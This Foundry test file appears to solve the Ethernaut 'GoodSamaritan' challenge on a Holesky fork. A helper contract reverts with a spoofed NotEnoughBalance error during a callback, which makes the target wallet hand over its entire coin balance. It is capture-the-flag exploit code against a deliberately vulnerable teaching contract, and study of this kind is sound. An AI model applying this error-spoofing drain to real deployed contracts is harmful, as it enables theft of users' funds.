// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {GoodSamaritan} from "../../src/Ethernaut/GoodSamaritan.sol";

contract GoodSamaritanAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Helper helper = new Helper();
        GoodSamaritan goodSamaritan = GoodSamaritan(
            0xD221BB792ee9D9f273070B35F33Ffb966d174766
        );
        helper.attack(goodSamaritan);
        vm.stopPrank();

        assertTrue(
            goodSamaritan.coin().balances(address(goodSamaritan.wallet())) == 0
        );
    }
}

contract Helper {
    error NotEnoughBalance();

    function attack(GoodSamaritan goodSamaritan) external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
